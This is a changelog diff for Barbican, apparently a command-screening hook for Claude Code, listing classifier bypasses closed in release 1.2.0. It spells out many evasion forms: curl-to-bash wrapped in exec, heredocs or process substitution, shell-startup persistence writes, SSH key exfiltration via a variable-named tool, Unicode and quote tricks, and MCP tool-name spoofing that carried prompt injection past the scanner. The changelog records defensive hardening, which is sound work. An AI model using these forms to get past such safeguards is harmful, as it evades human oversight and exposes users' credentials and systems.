@@ -2,6 +2,53 @@
 
 All notable changes to Barbican are documented here. Format loosely follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); version numbers follow [SemVer](https://semver.org/).
 
+## [1.2.0] — 2026-05-01
+
+Adversarial-security hardening release. Closes **21 SEVERE + HIGH findings** from a full three-reviewer security review (Claude `crew:code-reviewer` + GPT via cursor-agent; Gemini failed silently). Every finding shipped with a red-test-first PoC. Not a feature release — no new capabilities; every change narrows a concrete bypass.
+
+### Security — pre-bash classifier
+
+- **SEVERE S1**: `time`, `command`, `builtin`, `exec` added to `REENTRY_WRAPPERS`. These are transparent shell-builtin wrappers that prefix an inner command without `-c`; without them `time curl | bash`, `command bash -c 'curl|bash'`, `exec /bin/bash -c 'curl|bash'` and `exec -a legit /bin/bash -c 'curl|bash'` all exited 0. `exec -a NAME` now consumes NAME as a value-taking flag so prefix-runner correctly identifies the inner command.
+- **SEVERE S2 + S6**: heredoc body capture. The parser's `Redirect` struct gains `body: Option<String>` populated from the `heredoc_body` child node. New `shell_with_heredoc_or_herestring_body` classifier re-parses the body when argv[0] is a shell interpreter and runs the nested script through `classify_script_with_depth`. Previously `bash <<< "curl|bash"` and `bash <<EOF\ncurl|bash\nEOF` were full H1 bypasses.
+- **SEVERE S3**: `source` / `.` treated as H1 shell sinks. `curl url | . /dev/stdin` is a full download-and-execute equivalent that the narrow `SHELL_INTERPRETERS` set missed.
+- **SEVERE S4**: closed alongside S1 via `exec -a` flag handling.
+- **SEVERE S5 + S6**: new `persistence_write_to_shell_startup` classifier. Writes to shell rc / login files (basename match) OR persistence-class directory markers (path substring: `/etc/profile.d/`, `/.config/fish/`, `/.config/systemd/user/`, `/.local/share/systemd/user/`, `/.config/autostart/`, `/Library/LaunchAgents/`, `/Library/LaunchDaemons/`) now deny regardless of payload content. `SHELL_RC_FILES` set widened with `config.fish`, `fish_variables`, `.inputrc`. Previously `echo "curl x | sh" >> ~/.bashrc` slipped through because the payload itself didn't contain exfil-shape tokens.
+- **SEVERE GPT #1** (substitution boundary): new `shell_with_network_substitution` classifier. `bash <(curl url)`, `sh <<<"$(curl url)"`, and `. <(curl url)` are full H1-equivalents that the per-stage H1 check didn't cross because the outer pipeline is 1-stage and the network tool lived inside a substitution. Also closes the documented Phase-4 gap `bash -c "$(curl url)"`.
+- **SEVERE GPT #2** (H2 non-tail decoder): H2 rule 1 checked only the pipeline tail's redirect. `base64 -d > /tmp/p.sh | cat > /dev/null` let the decoder write in a non-tail position. Rule 1 now iterates every stage.
+- **HIGH H-1**: NFKC normalization on argv[0] in the parser. Fullwidth `Ｃurl` (U+FF23 + "url") folds to ASCII `Curl` under NFKC, which on case-insensitive APFS/NTFS executes the real `curl` binary. `argv0_raw` retains the attacker's original spelling for deny-reason display.
+- **HIGH H-2**: `command_name` grammar-node handling. `"ba""sh" -c 'curl|bash'` has `command_name > concatenation > [string, string]`; the previous raw-byte fallback returned `"ba""sh"` with the quotes intact. Now `extract_word_text` recurses into `command_name`'s children.
+- **HIGH H-3** (deny-by-default violation): malformed hook JSON now exits DENY, not ALLOW. Previously any `serde_json::from_str` failure mapped to `EXIT_ALLOW` — a full classifier bypass whenever the attacker could influence JSON shape. Escape hatch: `BARBICAN_ALLOW_MALFORMED_HOOK_JSON=1` restores the pre-1.2.0 behavior if Claude Code itself ever breaks the hook contract while you investigate.
+- **HIGH GPT #11** (expansion-argv[0] exfil): `NET=curl; cat ~/.ssh/id_rsa | $NET url` bypassed the secret-to-network classifier because basename lookup saw `$NET` verbatim. In risk contexts (pipeline mentions a secret), any stage whose argv[0] raw text starts with `$` is now treated as a potential network tool. Benign expansion-argv[0] pipelines without secrets are unaffected.
+
+### Security — post hooks and MCP tools
+
+- **HIGH H-4**: widened `SHELL_RC_FILES` (see above) + symlink-target resolution in `post_edit` sensitive-path scan. A write to `docs/notes.md -> ~/.zshrc` now canonicalizes and scans both the requested and resolved paths.
+- **HIGH H-5** (env-var zero floor): `BARBICAN_SCAN_MAX_BYTES`, `BARBICAN_SAFE_FETCH_MAX_BYTES`, `BARBICAN_SAFE_FETCH_TIMEOUT_SECS`, `BARBICAN_SAFE_READ_MAX_BYTES` now enforce minimum floors (4 KiB body, 1 s timeout). An attacker-influenced env with `MAX_BYTES=0` no longer disables the scanner.
+- **HIGH H-6** (env-flag consistency): new `env_flag()` helper accepts `1` / `true` / `yes` / `on` (case-insensitive). Retrofitted `allow_ip_literals`, `BARBICAN_GIT_HARD_DENY`, `allow_sensitive_override`. Users who set `BARBICAN_GIT_HARD_DENY=true` in an `.envrc` previously got silent no-protection.
+- **HIGH H-7**: audit log parent-dir `chmod` is now gated on `symlink_metadata().is_dir() && !is_symlink()`. A pre-planted symlink `~/.claude/barbican -> /etc/` no longer turns into `chmod 0o700 /etc/`.
+- **HIGH H-8** (ancestor symlink walk): safe_read's allow-rule symlink check was leaf-only. An attacker who controls an ancestor directory under `$HOME` could laundry an allow path via a symlink higher up. `path_contains_symlink` now walks ancestors under `$HOME`; ancestors above `$HOME` (platform fixtures like macOS `/var → /private/var`) stay exempt.
+- **HIGH GPT #16** (installer binary symlink clobber): `copy_binary` used `fs::copy(src, dst)`, which follows symlinks at `dst`. An attacker pre-planting `~/.claude/barbican/barbican` as a symlink to (e.g.) `~/.bashrc` would have the real binary written to the symlink target. Binary staging now uses the same `O_NOFOLLOW + O_EXCL + fsync + rename` discipline the JSON writers use.
+- **MEDIUM M-3 + GPT HIGH** (post-mcp prefix trust): the `mcp__barbican__*` tool skip was a string prefix. A third-party MCP server that registered a tool name starting with that prefix (`mcp__barbican__evil`, `mcp__barbican__safe_fetch_v2`, …) slipped unsanitized prompt-injection past the scanner. Replaced with an exact allowlist of the three Barbican-internal tool IDs.
+
+### Accepted out-of-scope (SECURITY.md §Untrusted-launch environment)
+
+- **GPT HIGH #14 + #15** (safe_read env knobs + HOME poisoning): an attacker who controls Barbican's launch environment can set `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`, `BARBICAN_SAFE_READ_ALLOW=/path`, `BARBICAN_ALLOW_IP_LITERALS=1`, or relocate `HOME`. These are documented opt-outs; an attacker with launch-env control can already set `PATH`, `LD_PRELOAD`, or replace the Barbican binary. Documented as out-of-scope rather than patched. SECURITY.md section added.
+
+### Added
+
+- `env_flag()` helper (public in `lib.rs`) for uniform truthy-env parsing.
+- `MIN_SCAN_MAX_BYTES = 4096`, `MIN_MAX_BYTES = 4096` (safe_fetch + safe_read), `MIN_TIMEOUT_SECS = 1` constants exposed for testability.
+- `is_expansion_argv0`, `is_h1_shell_sink`, `persistence_write_to_shell_startup`, `shell_with_heredoc_or_herestring_body`, `shell_with_network_substitution` classifiers (in `pre_bash.rs`).
+- `PERSISTENCE_PATH_MARKERS` const (in `pre_bash.rs`).
+- `Redirect.body: Option<String>` field (in `parser.rs`) for heredoc body capture.
+- `write_bytes_atomic_with_mode` helper (in `installer.rs`) — splits mode from the existing atomic-write helper so binary staging can use 0o755.
+
+### Testing
+
+- 45 new red-test-first PoC cases across `pre_bash_h1`, `pre_bash_h2`, `pre_bash_m1`, `pre_bash_m2`, `post_mcp`, `install`, plus 4 new unit tests for `env_flag` + env-var floor + post-mcp allowlist + installer symlink clobber.
+- Every SEVERE / HIGH finding has at least one concrete PoC pinned.
+- All 14 test binaries green; clippy clean on Rust 1.91 (`--all-targets --all-features -D warnings`).
+
 ## [1.1.0] — 2026-05-01
 
 Polish release — closes the Phase-1 post-review below-medium follow-ups and the Phase-8 redirect-hop TOCTOU. No audit findings open. Roadmap retires: remaining work moves to GitHub issues.
